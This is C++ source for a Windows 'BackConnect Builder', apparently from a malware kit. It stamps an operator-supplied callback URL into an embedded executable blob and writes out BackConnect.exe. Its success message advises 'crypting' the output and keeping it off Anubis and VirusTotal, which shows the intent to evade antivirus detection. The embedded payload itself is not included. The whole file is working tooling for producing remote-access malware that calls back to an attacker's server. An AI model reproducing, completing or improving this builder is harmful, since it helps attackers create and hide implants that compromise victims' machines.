
// simple 1337 builder for 1337 people (= all non-programmers)

#include "Windows.h"
#include "tchar.h"

int DrawUI(HINSTANCE hInstance);
LRESULT CALLBACK WindowProc(HWND Handle, UINT uMsg, WPARAM wParam, LPARAM lParam);

// in Executable.cpp, use the perl script to generate it
unsigned char bin_data1[];
#define SizeOfBinData1      /*sizeof(bin_data1)*/46080 /* Update this value if necessary! */


int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)
{
    DrawUI(hInstance);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 1;
}



HWND MainWindow;            // Main Window
HWND EditUrl;               // IP / DNS 
HWND ButtonBuild;           // "Build" button
HWND ButtonClose;           // "Close" button
int UrlChanged;             // if the text from IP/DNS edit box changed

#define Caption_Builder     L"BackConnect Builder"
#define Caption_Url         L"http://yourdomain.com/d.php"
#define Caption_Build       L"Build"
#define Caption_Close       L"Close"
#define Error_URL           L"Please enter a valid URL for the server connection"


/* creates the main Windows displaying the user interface */

int DrawUI(HINSTANCE hInstance)
{
    // register the Window class
    WNDCLASS MainWindowClass;
    memset(&MainWindowClass, 0, sizeof(MainWindowClass));
    MainWindowClass.lpfnWndProc = WindowProc;
    MainWindowClass.lpszClassName = L"1";
    MainWindowClass.hInstance = hInstance;
    MainWindowClass.hbrBackground = CreateSolidBrush(RGB(100, 100, 100));
    MainWindowClass.hCursor = LoadCursor(NULL, IDC_ARROW);
    if (!RegisterClass(&MainWindowClass))
        return 0;

    // create the main Window
    if (!(MainWindow = CreateWindow(L"1", Caption_Builder, WS_CAPTION | WS_SYSMENU | WS_CLIPSIBLINGS | WS_CLIPCHILDREN | WS_VISIBLE, (GetSystemMetrics(SM_CXSCREEN) - 650)/2, (GetSystemMetrics(SM_CYSCREEN) - 150)/2, 650, 150, NULL, NULL, hInstance, NULL)))
        return 0;

    HFONT FontVerdana = CreateFont(-11, 0, 0, 0, FW_NORMAL, false, false, false, DEFAULT_CHARSET, OUT_CHARACTER_PRECIS, CLIP_CHARACTER_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Verdana");
    HFONT FontLucidaConsole = CreateFont(-11, 0, 0, 0, FW_NORMAL, false, false, false, DEFAULT_CHARSET, OUT_CHARACTER_PRECIS, CLIP_CHARACTER_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Lucida Console");
    if (!FontVerdana || !FontLucidaConsole)
        return 0;

    EditUrl = CreateWindow(L"EDIT", NULL, WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL, 50, 30, 400, 15, MainWindow, NULL, hInstance, NULL);
    SendMessage(EditUrl, WM_SETFONT, (WPARAM)FontLucidaConsole, true);
    SendMessage(EditUrl, WM_SETTEXT, 0, (LPARAM)Caption_Url);
    UrlChanged = 0;

    ButtonBuild = CreateWindow(L"BUTTON", Caption_Build, WS_CHILD | WS_VISIBLE, 500, 30, 100, 25, MainWindow, NULL, hInstance, NULL);
    SendMessage(ButtonBuild, WM_SETFONT, (WPARAM)FontVerdana, true);

    ButtonClose = CreateWindow(L"BUTTON", Caption_Close, WS_CHILD | WS_VISIBLE, 500, 60, 100, 25, MainWindow, NULL, hInstance, NULL);
    SendMessage(ButtonClose, WM_SETFONT, (WPARAM)FontVerdana, true);

    UpdateWindow(MainWindow);

    return 1;
}


/* memstr not included in ANSI-C, include it here */

BYTE * memstr(BYTE * Buffer, BYTE * SearchFor, int BufferSize, int SearchForSize)
{
	BYTE *p;

	for (p = Buffer; p <= (Buffer - SearchForSize + BufferSize); p++)
	{
		if (memcmp(p, SearchFor, SearchForSize) == 0)
			return p; /* found */
	}
	return NULL;
}


/* Window callback function */

LRESULT CALLBACK WindowProc(HWND Handle, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {
    case WM_CREATE:
        return 0;
    case WM_PAINT:
        PAINTSTRUCT ps;
        BeginPaint(Handle, &ps);
        EndPaint(Handle, &ps);
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    case WM_COMMAND:
        if ((HWND)lParam == ButtonBuild)
        {
            // Build it!
            if (!UrlChanged)
            {
                MessageBox(NULL, Error_URL, L"Error", MB_OK);
                return 0;
            }

			char Url[MAX_PATH];
			SendMessageA(EditUrl, WM_GETTEXT, sizeof(Url), (LPARAM)&Url);

            // set the Url
		    char * ReplacePointer = (char *)memstr(bin_data1, (BYTE *)"#########", SizeOfBinData1, sizeof("#########") -1);
			strcpy(ReplacePointer, Url);

            // extract the executable
            HANDLE File = CreateFile(L"BackConnect.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
            if (File == INVALID_HANDLE_VALUE)
            {
                MessageBox(NULL, L"Error creating file.", L"Error", MB_OK);
                return 0;
            }

            DWORD NumberOfBytesWritten;
            if (!WriteFile(File, bin_data1, SizeOfBinData1, &NumberOfBytesWritten, NULL))
            {
                MessageBox(NULL, L"Error writing file.", L"Error", MB_OK);
                return 0;
            }

            CloseHandle(File);

            MessageBoxA(NULL, "Generated successfully, written to BackConnect.exe. Do not forget to crypt it, do not leak it on Anubis or VT.", "Successful", MB_OK);
        }
        else if ((HWND)lParam == ButtonClose)
        {
            PostQuitMessage(0);
        }

        else if ((HWND)lParam == EditUrl && (wParam >> 16) == EN_CHANGE)
        {
            UrlChanged = 1;
        }
        break;
    default:
        return DefWindowProc(Handle, uMsg, wParam, lParam);
    }

    return 0;
}

